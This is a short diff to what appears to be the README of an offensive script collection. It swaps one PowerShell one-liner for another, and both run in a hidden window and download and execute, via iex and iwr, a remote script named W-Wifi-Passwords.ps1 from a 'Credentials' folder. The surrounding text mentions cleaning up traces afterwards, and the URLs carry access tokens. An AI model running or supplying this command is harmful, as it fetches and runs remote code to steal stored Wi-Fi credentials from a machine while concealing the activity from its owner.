@@ -35,6 +35,6 @@ Then it cleans up traces of what you have done after.
 
 All
 ```powershell
-powershell -WindowStyle Hidden -Command "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glitter_Scripts/main/Credentials/W-Wifi-Passwords/W-Wifi-Passwords.ps1?token=GHSAT0AAAAAACJCV62V5276FTVUNEJL35JMZJVRJAA').Content"
+powershell -WindowStyle Hidden -Command "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glitter_Scripts/main/Windows/Credentials/WWifiPasswords/W-Wifi-Passwords.ps1?token=GHSAT0AAAAAACJCV62UREKJJ53JCTSCIP64ZJVTLCQ').Content"
 ```
 
